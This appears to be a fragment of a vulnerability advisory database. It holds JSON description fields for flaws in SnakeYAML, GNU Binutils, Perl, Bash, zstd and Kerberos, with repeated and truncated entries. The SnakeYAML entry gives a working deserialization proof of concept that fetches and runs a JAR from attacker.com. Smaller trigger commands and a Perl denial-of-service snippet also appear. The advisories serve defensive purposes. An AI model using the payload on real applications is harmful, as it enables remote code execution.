            "FullDescription": "[SnakeYAML](https://bitbucket.org/snakeyaml/snakeyaml/) is a popular Java-based YAML parsing that provides a high-level API for serialization and deserialization of YAML documents.\n\nIt was discovered that a crafted YAML file containing a Java `Constructor` can lead to remote code execution due to deserialization.\n\nSnakeYaml's Constructor class, which inherits from SafeConstructor, allows any class type to be deserialized. A ConstructorException is thrown, but only after the malicious\npayload is deserialized.\n\nTo exploit this issue, an attacker must find remote input that propagates into the `Yaml.load()` method. \nThe attacker must deserialize a [Java \"gadget\" class](http://frohoff.github.io/owaspsd-deserialize-my-shorts/) that's available in the application's classpath in order to achieve code execution via the deserialization. However - there are gadget classes that are available by default such as the built-in `javax.script.ScriptEngineManager`.\n\nA remote code execution PoC example, using the Java built-in class `javax.script.ScriptEngineManager`:\n```\nString strYaml = \"!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader \"\n                + \"[[!!java.net.URL [\\\"http://attacker.com\\\"]]]]\";;\nYaml yaml = new Yaml(new Constructor(Foo.class));\nyaml.load(strYaml);\n```\nThe PoC will run an arbitrary JAR file supplied from `http://attacker.com`. Note that even though `Constructor` receives a specific class type (`Foo.class`), any gadget class can be deserialized.\n\nNote that the vulnerability will not apply to applications that use the (non-default) `SafeConstructor`",

            "FullDescription": "The GNU [Binutils](https://www.gnu.org/software/binutils/) are a collection of binary tools. The main ones are: ld - the GNU linker, as - the GNU assembler and gold - a new, faster, ELF only linker. Most of these programs use BFD, the Binary File Descriptor library, to do low-level manipulation.\nIt was discovered that the BFD library can cause an out-of-bounds read when reading crafted debug info (DWARF info) from an ELF executable\nFor example - this can cause the `readelf` utility to crash when reading a crafted executable -\n`readelf -w ./PoC`\n\nNote that this issue cannot causes a 1-byte out-of-bounds write (overwriting a NULL terminator) which leads to an out-of-bounds read. Therefore - exploitation cannot lead to code execution in any case.\nThis leads to a very low severity since crashing a forked client process (ex. `readelf` or any other executable from binutils) has a negligible security impact.",

The main ones are: ld - the GNU linker, as - the GNU assembler and gold - a new, faster, ELF only linker. Most of these programs use BFD, the Binary File Descriptor library, to do low-level manipulation.\nIt was discovered that the BFD library can cause an out-of-bounds read when reading crafted debug info (DWARF info) from an ELF executable\nFor example - this can cause the `readelf` utility to crash when reading a crafted executable -\n`readelf -w ./poc2`\n\nNote that this issue cannot cause an out-of-bounds write (only an out-of-bounds read) and therefore cannot lead to code execution in any case.\nIn addition, the out-of-bounds read is a 1-byte read, making it unlikely to cause a crash or a meaningful data leak.\nThis leads to a very low severity since crashing a forked client process (ex. `readelf` or any other executable from binutils) has a negligible security impact.",

The main ones are: ld - the GNU linker, as - the GNU assembler and gold - a new, faster, ELF only linker. Most of these programs use BFD, the Binary File Descriptor library, to do low-level manipulation.\nIt was discovered that the BFD library can cause an out-of-bounds read when reading crafted debug info (DWARF info) from an ELF executable\nFor example - this can cause the `readelf` utility to crash when reading a crafted executable -\n`readelf -w ./poc2`\n\nNote that this issue cannot cause an out-of-bounds write (only an out-of-bounds read) and therefore cannot lead to code execution in any case.\nIn addition, the out-of-bounds read is a 1-byte read, making it unlikely to cause a crash or a meaningful data leak.\nThis leads to a very low severity since crashing a forked client process (ex. `readelf` or any other executable from binutils) has a negligible security impact.",

            "FullDescription": "[Perl 5 (often referred to as Perl)](https://www.perl.org/) is a high-level programming language known for its flexibility and text-processing capabilities, commonly used for scripting, automation, and web development tasks. It emphasizes readability and expressiveness, allowing developers to efficiently manipulate data and perform various tasks.\nAn issue has been discovered when handling warnings. The internal function `s_find_uninit_var()` checks for uninitialized variables. In case both the array/hash and the index are undefined, the warning mechanism tries to get the value of the index and then enters an infinite loop which causes stack exhaustion and eventually leads to Denial of Service.\n\nExample of vulnerable code:\n```perl\n#!/usr/bin/perl\nuse warnings;\n$x{$y}  # or $x[$y] where both x and y are undefined.\n```",

            "FullDescription": "The GNU [Binutils](https://www.gnu.org/software/binutils/) are a collection of binary tools. The main ones are: ld - the GNU linker, as - the GNU assembler and gold - a new, faster, ELF only linker. Most of these programs use BFD, the Binary File Descriptor library, to do low-level manipulation.\nIt was discovered that the BFD library can cause an out-of-bounds read when reading crafted debug info (DWARF info) from an ELF executable\nFor example - this can cause the `readelf` utility to crash when reading a crafted executable -\n`readelf -w ./poc2`\n\nNote that this issue cannot cause an out-of-bounds write (only an out-of-bounds read) and therefore cannot lead to code execution in any case.\nIn addition, the out-of-bounds read is a 1-byte read, making it unlikely to cause a crash or a meaningful data leak.\nThis leads to a very low severity since crashing a forked client process (ex. `readelf` or any other executable from binutils) has a negligible security impact.",

            "FullDescription": "[Bash](https://www.gnu.org/software/bash/) is a Unix shell, which is a command-line interface for interacting with an operating system. It is the default shell for most Linux distributions. Bash allows users to execute commands, manipulate files, and run scripts to automate tasks.\n\nWhen bash is compiled with [ASAN (AdressSanitizer)](https://github.com/google/sanitizers/wiki/AddressSanitizer), a script using a crafted [Shell parameter expansion](https://www.gnu.org/software/bash/manual/html_node/Shell-Parameter-Expansion.html) of type `${parameter@operator}` can lead to out-of-bound read of 1 byte. \nIn some circumstances (ex. Bash is compiled with ASAN) this can crash the bash process, but triggering a crash is unlikely in real-world scenarios.\n\nThe attackers must find a remote input that propagates to a bash script using this special parameter expansion which is not easy at all and very unlikely.",

Since `zstd` is a standalone (forked) tool - the crash has a minimal security impact.\n\nSpecifically, passing the `--output-dir-flat` or `--output-dir-mirror` arguments with an empty string, leads to an OOB read.\n\nIt should be noted that the OOB read is of 1 byte only, which on modern systems does not even lead to a crash (in most cases of production-built software)",

            "FullDescription": "[Kerberos](https://web.mit.edu/kerberos/) is a network authentication protocol. It is designed to provide strong authentication for client/server applications by using secret-key cryptography. A free implementation of this protocol is available from the Massachusetts Institute of Technology. Kerberos is available in many commercial products as well.\n\nA [Kerberos database](https://web.mit.edu/kerberos/krb5-1.12/doc/admin/database.html) contains all of a realm’s Kerberos principals, their passwords, and other administrative information about each principal. For the most part, you will use the `kdb5_util` program to manipulate the Kerberos database as a whole, and the `kadmin` program to make changes to the entries in the database. \n\nIn `kdb5_util`, there is a `process_k5beta7_princ` method responsible for adding Kerberos 5 beta 7 format data from a file to the Kerberos database. This function is vulnerable to integer overflow as a Database entry defined on 16-bits is assigned a 32-bits value from the given file. It turns out that it does not have any impact at all and it is not a security flaw.\n\nOriginally, the vulnerability was mistakenly reported as an Integer Overflow.\nThe issue should not affect any other data allocated close to the 16-bit integer in question. Furthermore, a negative value of the 16-bit integer does not impact the flow of the program in any meaningful way.\n\nTo trigger the integer truncation, an attacker has to get the user to use the `kdb5_util` utility to restore a Kerberos 5 - beta 7 format - database from a crafted malicious file. It can be done using the following command:\n```\nkdb5_util load -d DB_NAME DB_FILE \n```",

It is designed to provide strong authentication for client/server applications by using secret-key cryptography.

Kerberos is available in many commercial products as well.\n\nA [Kerberos database](https://web.mit.edu/kerberos/krb5-1.12/doc/admin/database.html) contains all of a realm’s Kerberos principals, their passwords, and other administrative information about each principal. For the most part, you will use the `kdb5_util` program to manipulate the Kerberos database as a whole, and the `kadmin` program to make changes to the entries in the database. \n\nIn `kdb5_util`, there is a `process_k5beta7_princ` method responsible for adding Kerberos 5 beta 7 format data from a file to the Kerberos database. This function is vulnerable to integer overflow as a Database entry defined on 16-bits is assigned a 32-bits value from the given file. It turns out that it does not have any impact at all and it is not a security flaw.\n\nOriginally, the vulnerability was mistakenly reported as an Integer Overflow.\nThe issue should not affect any other data allocated close to the 16-bit integer in question. Furthermore, a negative value of the 16-bit integer does not impact the flow of the program in any meaningful way.\n\nTo trigger the integer truncation, an attacker has to get the user to use the `kdb5_util` utility to restore a Kerberos 5 - beta 7 format - database from a crafted malicious file. It can be done using the following command:\n```\nkdb5_util load -d DB_NAME DB_FILE \n```",

            "FullDescription": "[Kerberos](https://web.mit.edu/kerberos/) is a network authentication protocol. It is designed to provide strong authentication for client/server applications by using secret-key cryptography. A free implementation of this protocol is available from the Massachusetts Institute of Technology. Kerberos is available in many commercial products as well.\n\nA [Kerberos database](https://web.mit.edu/kerberos/krb5-1.12/doc/admin/database.html) contains all of a realm’s Kerberos principals, their passwords, and other administrative information about each principal. For the most part, you will use the `kdb5_util` program to manipulate the Kerberos database as a whole, and the `kadmin` program to make changes to the entries in the database. \n\nIn `kdb5_util`, there is a `process_k5beta7_princ` method responsible for adding Kerberos 5 beta 7 format data from a file to the Kerberos database. This function is vulnerable to integer overflow as a Database entry defined on 16-bits is assigned a 32-bits value from the given file. It turns out that it does not have any impact at all and it is not a security flaw.\n\nOriginally, the vulnerability was mistakenly reported as an Integer Overflow.\nThe issue should not affect any other data allocated close to the 16-bit integer in question. Furthermore, a negative value of the 16-bit integer does not impact the flow of the program in any meaningful way.\n\nTo trigger the integer truncation, an attacker has to get the user to use the `kdb5_util` utility to restore a Kerberos 5 - beta 7 format - database from a crafted malicious file. It can be done using the following command:\n```\nkdb5_util load -d DB_NAME DB_FILE \n```",
